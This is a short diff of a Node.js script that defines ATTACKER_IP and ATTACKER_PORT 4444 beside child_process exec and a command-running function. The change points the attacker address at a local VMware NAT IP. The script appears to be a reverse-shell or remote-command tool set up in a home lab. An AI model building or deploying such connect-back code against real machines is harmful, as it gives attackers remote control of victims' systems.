@@ -3,7 +3,7 @@ const { exec } = require('child_process');
 const fs = require('fs');
 const os = require('os');
 
-const ATTACKER_IP = '192.168.217.139';
+const ATTACKER_IP = '192.168.217.1';  // Your Windows VMware NAT IP
 const ATTACKER_PORT = 4444;
 
 function executeCommand(command, callback) {
